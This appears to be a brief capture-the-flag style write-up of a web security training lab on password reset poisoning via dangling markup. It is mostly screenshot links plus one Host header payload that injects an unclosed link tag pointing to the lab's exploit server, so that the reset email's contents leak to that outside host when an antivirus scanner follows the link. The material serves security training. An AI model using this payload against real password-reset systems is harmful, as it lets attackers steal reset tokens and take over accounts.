# EXPERT: Password reset poisoning via dangling markup

When sending forgot password requst:

![Снимок экрана 2025-12-03 в 17.08.14.png](EXPERT%20Password%20reset%20poisoning%20via%20dangling%20marku/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.08.14.png)

![Снимок экрана 2025-12-03 в 17.06.55.png](EXPERT%20Password%20reset%20poisoning%20via%20dangling%20marku/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.06.55.png)

![Снимок экрана 2025-12-03 в 17.07.12.png](EXPERT%20Password%20reset%20poisoning%20via%20dangling%20marku/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.07.12.png)

In our case, this link will be scanned with the antivirus software that will send a request over the inserted link.

NOTE: `:` is used in Host header to represent a valid arbitrary port, where we will inject dangling markup:

```python
Host: 0a5100af0318ec038112987b00f70017.web-security-academy.net:'<a href="//exploit-0a2000ef03f3ece181639745018b003e.exploit-server.net/?
```

![Снимок экрана 2025-12-03 в 17.10.45.png](EXPERT%20Password%20reset%20poisoning%20via%20dangling%20marku/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.10.45.png)

![Снимок экрана 2025-12-03 в 17.12.09.png](EXPERT%20Password%20reset%20poisoning%20via%20dangling%20marku/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.12.09.png)

![Снимок экрана 2025-12-03 в 17.12.40.png](EXPERT%20Password%20reset%20poisoning%20via%20dangling%20marku/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-03_%D0%B2_17.12.40.png)